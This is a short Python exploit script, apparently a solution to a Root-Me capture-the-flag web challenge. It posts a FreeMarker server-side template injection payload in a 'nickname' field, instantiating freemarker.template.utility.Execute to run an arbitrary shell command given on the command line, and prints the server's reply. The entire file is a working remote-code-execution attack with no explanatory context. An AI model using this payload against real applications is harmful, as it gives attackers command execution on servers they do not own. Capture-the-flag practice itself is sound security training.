import requests, sys


def conn():
    global header
    s = requests.Session()
    url = 'http://challenge01.root-me.org/web-serveur/ch41/check'
    data = inject()
    print(data)
    reponse = s.post(url=url, data=data).text
    print(reponse)


def inject():
    command = sys.argv[1]
    data = {'nickname': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + command + '") }'}
    return (data)


if __name__ == "__main__":
    try:
        conn()
    except (IOError, SystemExit):
        raise